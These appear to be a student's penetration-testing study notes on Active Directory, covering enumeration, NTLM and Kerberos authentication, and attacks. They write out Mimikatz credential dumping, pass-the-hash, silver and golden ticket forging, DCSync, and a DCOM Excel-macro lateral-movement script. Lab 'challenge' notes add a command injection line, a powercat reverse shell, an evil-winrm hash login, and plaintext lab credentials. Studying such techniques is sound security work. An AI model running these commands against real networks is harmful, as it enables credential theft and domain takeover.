------------------
NOTES
------------------

Huge attack surface, service that allows sysadmins to update and manage OSs, users, and data access

AD Theory
	Several components, most importantly is the Domain Controller (DC)
		core of AD, stores all info about how the instance is configured
		enforces the rules that govern how objects in a domain interact with each other
	Complexity is based on the control that  the network admins have vested in them
	Domain
		created for each instance of AD
		usually is called something like corp.com or corp.local or something
		in the domain, can have various objects such as computers and users
	Organizational Units (OUs)
		containers for storing and grouping objects
			comparable to file system folders
		computer objects
			actual servers and machines that are domain joined
		user objects
			typically represent employees of a company
		all objects have attributes such as name, username, password, etc

AD Enuermation
	typically methodology consists of compromising a box then using that box to pivot internally
	use groups to assign perms
		therefore there are higher value groups and targets
		compromising member of Domain Admins >>>> some rando user
	Compromise of the DC itself
		can be used to modify all the domain joined computers
		also has the hashes of all the domain user accounts

	Traditional Approach
		LOLBINS
		net.exe
			net user
			net user /domain
			net user <username> /domain
			net group /domain

	Modern Approach
		Powershell
		LDAP Provider path
			LDAP://HostName[:PortNumber][/DistinguishedName]
			find these components with:
				[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
		Example
			PdcRoleOwner            : DC01.corp.com
			Name                    : corp.com

			use getLDAPProviderPath.ps1
				LDAP://DC01.corp.com/DC=corp,DC=com

	Currently Logged on Users
		Import-Module .\Powerview.ps1
		Get-NetLoggedon -ComputerName client251
		Get-NetSession -ComputerName dc01

	Enumeration through SPNs
		services laucned through the system itself are service accounts
		can also be apart of high value groups
		isolated applications can use a set of predefined accounts like LocalSystem, LocalService, and NetworkService
		more complex apps like MSSQL, MySQL, IIS, etc. a domain user can be used
		service instance identifier called SPNs can be used to link an account with a service
		enumerating SPNs can get IPs and ports with application, limiting need for broad scanning

		finding a hostname on an internal domain
			serviceprincipalname    {HTTP/CorpWebServer.corp.com}
				what is CorpWebServer?
			nslookup CorpWebServer.corp.com
				Name:    corpwebserver.corp.com
				Address:  192.168.1.110
		empire Get-SPN.py

Active Directory Authentication
	use enumerated users, groups, SPNs to compromise the Domain
	either uses Kerberos or NTLM auth

	NTLM Authentication
		used when a client authenticates to a server using an IP (not a hostname)
		or
			if the user attempts to auth to a hostname that is not registered on the internal DNS
			a third party app chooses to use NTLM auth

		Steps of NTLM Auth
			1. Client calc NTLM Hash
			2. Client send username to app server
			3. App server sends back a nonce
				3a. Nonce also known as the challnege
			4. Client send a response (encrypted nonce) back to app server
			5. App server sends response, user, and nonce to the DC
			6. DC encrpyts nonce with the NTLM hash of the user and compares it to the response
			7. Approve authentication

		NTLM hashes are fast, can be cracked semi-easily

	Kerberos Authentication
		Uses a ticket system
		uses the DC in the role of a key distribution center (KDC)

		Steps of Kerberos Auth
			1. Client sends authentication server request
				1a. Authentication Server Request == AS_REQ
			2. DC sends auth server reply
				1a. Authentication Server Reply == AS_REP
				1b. AS_REP contains the session key and a ticket granting ticket (TGT)
					1b1. TGT contains info about the user, is encrypted with a secret key to prevent tampering
				1c. Session key is encrypted with the user's password hash
			3. Client sends the ticket granting servive request
			4. DC sends the ticket granting server reply
			5. Client sends application request to the application server
			6. app server sends the client the service authentication

	Cached Credential Storage and Retrieval
		currently the password hashes are stored in the memory space for LSASS
		need mimikatz with elevated privs

		mimikatz.exe
		privilege::debug
		sekurlsa::logonpasswords

		TGT and service tickets are also stored locally in LSASS

		sekurlsa::tickets
			TGT vs TGS
				Stealing a TGS would only allow us to particular resources associated with the tickets
				Stealing a TGT would allow us to forge TGS's for arbitrary services

lost my notes so quick recap on overpass the hash
	get logonpasswords
		mimikatz.exe
		privilege::debug
		sekurlsa::logonpasswords
	sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:e2b475c11da2a0748290d87aa966c327 /run:PowerShell.exe
	net use \\dc01
	.\PsExec.exe \\dc01 cmd.exe

	Pass the Ticket
		TGS may be exported and reused on different machines
		TGT can only be used on the machine it was granted for
		If SPN is not local admin on any machines, cannot laterally move/ dump creds
		Silver Ticket - forge our own service ticket to access a target resource
		Mimikatz can create a silver ticket and inject it into memory
			kerberos::golden
		To create a ticket:
			need the SID
				SID Structure = S-R-I-S
					S = Literal string "S"
					R = Revision level (usually 1)
					I = identifier authority (usually 5)
					S = one or more subauthority values
				ex. S-1-5-21-2536614405-3629634762-1218571035-1116
					1116 = RID of the domain
						can easily get the RID from our own SID
							whoami /user
		passing a  ticket with mimikatz
			passing a ticket to an IIS webserver

			kerberos::purge
			kerberos::list
			kerberos::golden /user:offsec /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /target:CorpWebServer.corp.com /service:HTTP /rc4:E2B475C11DA2A0748290D87AA966C327 /ptt
				/user = username
				/domain = domain name
				/sid = sid of offsec account
				/target = fully qualified hostname of the target (this example its a webserver)
				/service = protocol of the app (HTTP for web here)
				/rc4 = hash type of the password hash
				/ptt = pass the ticket

	Distribued Component Object Model - DCOM
		COM = microsoft system for software components to interact
			either same process or cross process interactoins
		DCOM used for interaction between networked computers
		Require the presence of Microsoft office, best used against workstations

	Need some admin privs to access the smb shares
	Create a macro enabled excel sheet, save it as .xls
	Copy the file from the local machine to the victim box
		$LocalPath = "C:\Users\jeff_admin.corp\myexcel.xls"

		$RemotePath = "\\192.168.1.110\c$\myexcel.xls"

		[System.IO.File]::Copy($LocalPath, $RemotePath, $True)
	Open the excel sheet
		$Workbook = $com.Workbooks.Open("C:\myexcel.xls")
		results in an error, file was created as the system user with desktop
	Create a SYSTEM desktop Directory
		$Path = "\\192.168.1.110\c$\Windows\sysWOW64\config\systemprofile\Desktop"

		$temp = [system.io.directory]::createDirectory($Path)

	Final script
		$com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "192.168.1.110"))
		$LocalPath = "C:\Users\jeff_admin.corp\myexcel.xls"
		$RemotePath = "\\192.168.1.110\c$\myexcel.xls"
		[System.IO.File]::Copy($LocalPath, $RemotePath, $True)
		$Path = "\\192.168.1.110\c$\Windows\sysWOW64\config\systemprofile\Desktop"
		$temp = [system.io.directory]::createDirectory($Path)
		$Workbook = $com.Workbooks.Open("C:\myexcel.xls")
		$com.Run("mymacro")

AD Persistence
	Golden Tickets
		Encrypts TGTs with a secret key, the password hash of the domain user krbtgt
		Could createa golden ticket saying an arbitrary domain user is a member of the domain admins group
		find the krbtgt hash and pass the ticket like before
			kerberos::golden /user:fakeuser /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /krbtgt:75b60230a2394a812000dbfad8415965 /ptt
				/user is and /krbtgt are different

			misc::cmd
			psexec.exe \\dc01 cmd.exe

			NOTE: psexec.exe \\192.168.1.110 cmd.exe does not work, need the hostname
				giving the ip address would use NTLM auth instead of kerberos

	DCSync
		if compromised a domain controller, can dump all the admin password hashes
			lsadump::dcsync /user:Administrator

Challenge 1
	CMD injection
		| echo type hi | cmd.exe
	Download powercat from kali box, place it in c:\Windows\TEMP\powercat.ps1
	import the module and run the powercat shell
		Import-Module -Name <path>; powercat -c ip -p port -e cmd.exe

	Nathan:abc123//
	Allison:RockYou!
	evil-winrm -u Administrator -H 8c802621d2e36fc074345dded890f3e5 -i 192.168.130.57
Challenge 2
	adam:fiosadf
